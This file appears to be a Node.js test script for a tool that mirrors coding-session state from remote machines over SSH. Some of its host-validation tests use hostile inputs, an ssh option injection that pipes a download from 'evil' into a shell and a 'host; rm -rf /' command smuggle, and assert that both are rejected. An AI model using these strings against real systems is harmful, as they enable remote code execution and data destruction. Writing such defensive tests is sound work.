// Verifies the remote-SSH source: host validation, the two fetch framings,
// and that a remote source produces byte-identical sessions to a local one.
// Run: node scripts/remote-check.mjs
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readWindowStates, validHost } from "../src/window-state.mjs";

// --- validHost ------------------------------------------------------------
assert.equal(validHost("192.168.2.6"), "192.168.2.6", "a plain host passes");
assert.equal(validHost("pi@192.168.2.6"), "pi@192.168.2.6", "user@host passes");
assert.equal(validHost("beast.local"), "beast.local", "a dotted name passes");
// A leading dash is an ssh *option*, not a host: `-oProxyCommand=...` would
// run locally. execFile does not help — the parsing is ssh's own.
assert.equal(validHost("-oProxyCommand=curl evil|sh"), null, "a leading dash is rejected");
assert.equal(validHost("host; rm -rf /"), null, "shell metacharacters are rejected");
assert.equal(validHost("host name"), null, "a space is rejected");
assert.equal(validHost(""), null, "empty is rejected");
assert.equal(validHost(undefined), null, "absent is null, not a throw");
assert.equal(validHost(42), null, "a non-string is null, not a throw");

// --- readWindowStates carries host ---------------------------------------
const dir = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir, `${process.pid}.json`),
  JSON.stringify({ folders: ["/home/pi/x"], focused: false, activeSessionId: null, host: "192.168.2.6" })
);
const [win] = readWindowStates(dir);
assert.equal(win.host, "192.168.2.6", "a published host is returned");

const dir2 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir2, `${process.pid}.json`),
  JSON.stringify({ folders: ["/x"], focused: false, activeSessionId: null, host: "-oProxyCommand=x" })
);
assert.equal(readWindowStates(dir2)[0].host, null, "a hostile host is dropped, the window is kept");

const dir3 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(join(dir3, `${process.pid}.json`), JSON.stringify({ folders: ["/x"], focused: true }));
assert.equal(readWindowStates(dir3)[0].host, null, "a window with no host reads null, not undefined");

// --- call 1 framing -------------------------------------------------------
import { sshArgs, splitTreeStream } from "../src/remote-fs.mjs";

// Each line is `pid ppid`. The pid set must come out exactly as it did when
// the line held a pid alone — that set is what `isAlive` is, and a regression
// there drops every remote session as dead.
const treeStream = Buffer.concat([
  Buffer.from("2187779 2187575\n1 0\n412 1\n---\n"),
  Buffer.from("TAR-BYTES-\x00\x01\x02"),
]);
const split = splitTreeStream(treeStream);
assert.deepEqual([...split.pids].sort((a, b) => a - b), [1, 412, 2187779], "pids parse");
assert.equal(split.tar.toString("binary"), "TAR-BYTES-\x00\x01\x02", "tar bytes survive the split byte-exact");

// A separator inside the tar payload must not re-split: only the first wins.
const twice = splitTreeStream(Buffer.from("7\n---\nA\n---\nB"));
assert.equal(twice.tar.toString(), "A\n---\nB", "only the first separator splits the stream");

// The second column is the ppid table the ancestry walk needs. It is fetched
// here, during the poll, because a key press must never wait on ssh.
assert.equal(split.ppids.get(2187779), 2187575, "the ppid column is kept");
assert.equal(split.ppids.get(412), 1, "for every line that has one");

// A host with no usable `ps` falls back to a pid-only listing. That must still
// yield a correct pid set — sessions stay alive — and simply no ancestry, which
// costs the terminal reveal and nothing else.
const pidsOnly = splitTreeStream(Buffer.from("2187779\n1\n412\n---\ntar"));
assert.deepEqual([...pidsOnly.pids].sort((a, b) => a - b), [1, 412, 2187779], "a pid-only listing still parses");
assert.equal(pidsOnly.ppids.size, 0, "and yields no ancestry rather than a wrong one");

// A host that answered nothing is empty, never a throw.
assert.deepEqual([...splitTreeStream(Buffer.alloc(0)).pids], [], "an empty stream has no pids");
assert.equal(splitTreeStream(Buffer.alloc(0)).tar.length, 0, "an empty stream has no tar");
assert.equal(splitTreeStream(Buffer.alloc(0)).ppids.size, 0, "an empty stream has no ancestry");

// --- ssh argv -------------------------------------------------------------
const argv = sshArgs("192.168.2.6", "/tmp/cm/%r@%h:%p");
assert.equal(argv.at(-1), "192.168.2.6", "the host is the last argument");
assert.equal(argv.at(-2), "--", "the host is passed after --, so a dash cannot become an option");
assert.ok(argv.includes("BatchMode=yes"), "never prompts for a password");
assert.ok(argv.includes("ConnectTimeout=5"), "a dead host fails fast");

// --- call 2 framing -------------------------------------------------------
import { parseTails } from "../src/remote-fs.mjs";

const NUL = Buffer.from([0]);

// A short file: fewer than TAIL_BYTES came back, so tail had nothing more to
// give and absence in the lines is absence in the file.
const short = Buffer.concat([Buffer.from("a\nb\n"), NUL]);
assert.deepEqual(parseTails(short, ["/p/a.jsonl"]), new Map([["/p/a.jsonl", { lines: ["a", "b", ""], whole: true }]]), "a short file is whole");

// A full tail window: whole must be false — this is the case that makes
// startedEmpty lie, and a wrong `true` here puts CLEAR on a busy session.
const body = "x".repeat(65536);
const long = Buffer.concat([Buffer.from(body), NUL]);
assert.equal(parseTails(long, ["/p/b.jsonl"]).get("/p/b.jsonl").whole, false, "a full tail window is not whole");

// Exactly TAIL_BYTES is reported not-whole. A file of exactly that size is
// indistinguishable from a larger one truncated to it, and this is the safe
// direction: it withholds startedEmpty rather than asserting it.
assert.equal(parseTails(Buffer.concat([Buffer.from("x".repeat(65535)), NUL]), ["/p/c.jsonl"]).get("/p/c.jsonl").whole, true, "one byte under the window is whole");

// Several files in one stream, in the order they were asked for.
const many = Buffer.concat([Buffer.from("A\n"), NUL, Buffer.from("B\n"), NUL]);
const manyOut = parseTails(many, ["/p/x.jsonl", "/p/y.jsonl"]);
assert.deepEqual(manyOut.get("/p/x.jsonl").lines, ["A", ""], "the first field ends at its terminator");
assert.deepEqual(manyOut.get("/p/y.jsonl").lines, ["B", ""], "the second field starts after it");

// The framing must not desync when a file yields more bytes than anything
// predicted — the live-append race a length prefix could not survive.
const grew = Buffer.concat([Buffer.from("A\nA\nA\n"), NUL, Buffer.from("B\n"), NUL]);
const grewOut = parseTails(grew, ["/p/x.jsonl", "/p/y.jsonl"]);
assert.deepEqual(grewOut.get("/p/x.jsonl").lines, ["A", "A", "A", ""], "a field longer than expected stays its own field");
assert.deepEqual(grewOut.get("/p/y.jsonl").lines, ["B", ""], "and the next file is still read from the right offset");

// A missing file is an empty field: unknown, and it consumes exactly its terminator.
const missing = parseTails(Buffer.concat([NUL, Buffer.from("B\n"), NUL]), ["/p/gone.jsonl", "/p/y.jsonl"]);
assert.deepEqual(missing.get("/p/gone.jsonl"), { lines: [], whole: false }, "a missing file is unknown, not empty");
assert.deepEqual(missing.get("/p/y.jsonl").lines, ["B", ""], "and the next file still parses");

// A stream that stopped before its terminator yields unknown.
assert.deepEqual(parseTails(Buffer.from("ab"), ["/p/cut.jsonl"]), new Map([["/p/cut.jsonl", { lines: [], whole: false }]]), "an unterminated field is unknown");

// More paths than fields: the surplus is unknown rather than undefined.
const fewer = parseTails(Buffer.concat([Buffer.from("A\n"), NUL]), ["/p/x.jsonl", "/p/missing.jsonl"]);
assert.deepEqual(fewer.get("/p/missing.jsonl"), { lines: [], whole: false }, "a path with no field at all is unknown");

// --- one body, two sources ------------------------------------------------
// The whole point of the design: a remote source is the same code reading the
// same bytes. Build one fixture tree, read it as local, then read it again as a
// "remote" source whose tail and isAlive are canned, and require the two to
// agree on everything but `host`.
import { mkdir } from "node:fs/promises";
import { getLiveSessions, localSource, transcriptPathFor } from "../src/sessions.mjs";

const fx = await mkdtemp(join(tmpdir(), "streamdeck-remote-fixture-"));
await mkdir(join(fx, "sessions"), { recursive: true });
await mkdir(join(fx, "ide"), { recursive: true });
const SID = "3afa50c6-168d-4a35-8448-dcb2350d1bff";
const CWD = "/home/pi/domotica/dom-setup";
await writeFile(
  join(fx, "sessions", "2187779.json"),
  JSON.stringify({
    pid: process.pid, // alive for the local source
    sessionId: SID,
    cwd: CWD,
    kind: "interactive",
    entrypoint: "cli",
    name: "dom-setup-2d",
    status: "idle",
    statusUpdatedAt: 1786879076976,
  })
);
await writeFile(
  join(fx, "ide", "39433.lock"),
  JSON.stringify({ workspaceFolders: [CWD], ideName: "Visual Studio Code" })
);
const transcript = transcriptPathFor({ cwd: CWD, sessionId: SID }, fx);
await mkdir(join(transcript, ".."), { recursive: true });
const aiTitleLine = JSON.stringify({ type: "assistant", aiTitle: "wiring the relay board" });
await writeFile(transcript, aiTitleLine + "\n");

const localOut = await getLiveSessions([localSource(fx)]);
assert.equal(localOut.length, 1, "the fixture yields exactly one session");
assert.equal(localOut[0].host, null, "a local session carries no host");

const remoteSource = {
  host: "192.168.2.6",
  root: fx,
  isAlive: (pid) => pid === process.pid,
  tail: async () => ({ lines: [aiTitleLine, ""], whole: true }),
};
const remoteOut = await getLiveSessions([remoteSource]);
assert.equal(remoteOut.length, 1, "the same tree read as remote yields the same one session");
assert.equal(remoteOut[0].host, "192.168.2.6", "a remote session carries its host");
assert.deepEqual(
  { ...remoteOut[0], host: null },
  { ...localOut[0], host: null },
  "a remote source and a local source cannot disagree about a session"
);

// isAlive is per source: a remote pid must never be checked against this
// machine's process table.
const deadRemote = await getLiveSessions([{ ...remoteSource, isAlive: () => false }]);
assert.deepEqual(deadRemote, [], "a pid absent from the host's list drops the session");

// Two sources at once, which is the daemon's real shape.
const both = await getLiveSessions([localSource(fx), remoteSource]);
assert.equal(both.length, 2, "sources concatenate");

// The ancestor chain is computed here, during the poll, from the host's own
// process table — never at press time, because the press is a synchronous key
// handler that cannot wait on ssh, and never from the local table, whose pids
// mean something else entirely on this machine.
const withPpids = await getLiveSessions([
  { ...remoteSource, ppids: new Map([[process.pid, 4242], [4242, 77]]) },
]);
assert.deepEqual(
  withPpids[0].ancestors,
  [process.pid, 4242, 77],
  "a remote session carries its chain, walked from the host's own ppid table"
);

// A host whose `ps` produced no second column yields no chain rather than a
// wrong one. The reveal is lost for that host; the session is not.
const noPpids = await getLiveSessions([{ ...remoteSource, ppids: new Map() }]);
assert.equal(noPpids[0].ancestors, undefined, "no ppid table means no chain, not a guessed one");

// A local session has no chain stamped at all — `requestFocus` walks this
// machine's live table at press time, which is both correct and current.
assert.equal(localOut[0].ancestors, undefined, "a local session carries no precomputed chain");

// The canned tail above returns what the fixture file happens to contain, so
// the deepEqual cannot tell an injected tail from a local read. Give this one
// content that exists nowhere on disk: if the source's tail is ever bypassed,
// this is the assertion that fails. TREE_CMD does not fetch transcripts at
// all, so a bypass means every remote session silently loses its title.
const injected = await getLiveSessions([
  {
    ...remoteSource,
    tail: async () => ({ lines: [JSON.stringify({ type: "assistant", aiTitle: "from the tail" }), ""], whole: true }),
  },
]);
assert.equal(injected[0].aiTitle, "from the tail", "the source's tail reads the transcript, never the local file");
assert.equal(remoteOut[0].root, fx, "the source's root travels on the session");

// A source's own code (isAlive, tail) can throw where a local read would
// merely fail try/catch — one bad host must not blank the others' keys.
const mixed = await getLiveSessions([localSource(fx), { ...remoteSource, isAlive: () => { throw new Error("dead host"); } }]);
assert.equal(mixed.length, 1, "a throwing source contributes nothing, but the healthy source is unaffected");
assert.equal(mixed[0].host, null, "the surviving session is the local one");

// --- the tree is replaced, never merged -----------------------------------
import { readdir } from "node:fs/promises";
import { swapTree } from "../src/remote-fs.mjs";

const swapRoot = await mkdtemp(join(tmpdir(), "streamdeck-remote-swap-"));
const finalDir = join(swapRoot, "host");
await mkdir(join(finalDir, "ide"), { recursive: true });
await writeFile(join(finalDir, "ide", "closed.lock"), "{}");

const staging = join(swapRoot, "host.new");
await mkdir(join(staging, "ide"), { recursive: true });
await writeFile(join(staging, "ide", "open.lock"), "{}");

await swapTree(staging, finalDir);
assert.deepEqual(await readdir(join(finalDir, "ide")), ["open.lock"], "a lock the remote deleted does not survive the swap");
assert.deepEqual(await readdir(swapRoot), ["host"], "the staging directory is cleaned up");

// --- cadence, backoff and the kill switch ---------------------------------
import { cachedSources, dueHosts, remoteSources } from "../src/remote-hosts.mjs";

const w = (host) => ({ pid: 1, folders: ["/x"], focused: false, activeSessionId: null, host });
const memo = new Map();

assert.deepEqual(dueHosts([w("h1"), w(null)], 0, memo), ["h1"], "only windows with a host are fetched");
assert.deepEqual(dueHosts([w("h1"), w("h1")], 0, memo), ["h1"], "two windows on one host are one fetch");

// A remote host polls slower than the 2s local loop: "not on the critical path"
// is a statement about the daemon, not about the Raspberry Pi it is asking.
memo.set("h1", { lastAt: 0, failures: 0 });
assert.deepEqual(dueHosts([w("h1")], 2000, memo), [], "not due 2s after a success");
assert.deepEqual(dueHosts([w("h1")], 6000, memo), ["h1"], "due 6s after a success");

// Consecutive failures back off 5s, 10s, 30s; one success resets.
memo.set("h2", { lastAt: 0, failures: 1 });
assert.deepEqual(dueHosts([w("h2")], 4000, memo), [], "not due inside the first backoff");
assert.deepEqual(dueHosts([w("h2")], 6000, memo), ["h2"], "due after 5s");
memo.set("h2", { lastAt: 0, failures: 3 });
assert.deepEqual(dueHosts([w("h2")], 20000, memo), [], "a third failure waits 30s");
assert.deepEqual(dueHosts([w("h2")], 31000, memo), ["h2"], "and is due after it");
memo.set("h2", { lastAt: 0, failures: 9 });
assert.deepEqual(dueHosts([w("h2")], 31000, memo), ["h2"], "the backoff is capped at 30s");

// A fetch already running is never dispatched again, however overdue it looks.
// lastAt is stamped on completion, so without this a slow fetch stays "due"
// for its whole duration and a second one races it into the same staging dir.
memo.set("h3", { lastAt: 0, failures: 0, inFlight: true });
assert.deepEqual(dueHosts([w("h3")], 999999, memo), [], "a host with a fetch in flight is not due");
memo.set("h3", { lastAt: 0, failures: 0, inFlight: false });
assert.deepEqual(dueHosts([w("h3")], 999999, memo), ["h3"], "and is due again once that fetch lands");

process.env.STREAMDECK_NO_REMOTE = "1";
assert.deepEqual(dueHosts([w("h1")], 999999, memo), [], "the kill switch stops every fetch");
delete process.env.STREAMDECK_NO_REMOTE;

// --- remoteSources: eviction must not strip an in-flight guard -------------
const evictMemo = new Map();
evictMemo.set("busy", { lastAt: 0, failures: 0, source: null, inFlight: true });
evictMemo.set("gone", { lastAt: 0, failures: 0, source: { host: "gone" } });
// Neither host has a live window this tick. Decoupling the poll from the
// fetch (allSources() no longer awaits remoteSources()) means a new
// remoteSources() call can land here while "busy"'s fetch — started by an
// earlier, still-unsettled call — is genuinely still running: a window
// reload mid-fetch is routine (every extension update needs one), and its
// republish under a new pid makes the host briefly absent from `windows`.
// An unconditional delete would strip the in-flight claim, letting the next
// tick dispatch a second fetch into the same staging directory and
// ControlPath as the first.
await remoteSources([], 0, evictMemo, async () => null);
assert.ok(evictMemo.has("busy"), "an in-flight entry survives eviction even once its window is gone");
assert.ok(!evictMemo.has("gone"), "a settled entry for a host with no live window is still evicted");

// --- cachedSources: what the poll reads, no fetch involved -----------------
const cacheMemo = new Map();
cacheMemo.set("ok", { lastAt: 0, failures: 0, source: { host: "ok" } });
cacheMemo.set("down", { lastAt: 0, failures: 2, source: null });
assert.deepEqual(
  cachedSources([w("ok"), w("down")], cacheMemo),
  [{ host: "ok" }],
  "a failed host's null source is dropped, a cached one is returned"
);

// A host whose window has closed still has a memo entry (nothing evicted it
// yet — that's remoteSources' job, run on the next call), but cachedSources
// only looks at this tick's live hosts, so a stale entry is never returned.
assert.deepEqual(
  cachedSources([w("ok")], cacheMemo),
  [{ host: "ok" }],
  "a memo entry for a host with no live window this tick is not returned"
);

console.log("remote-check: OK");
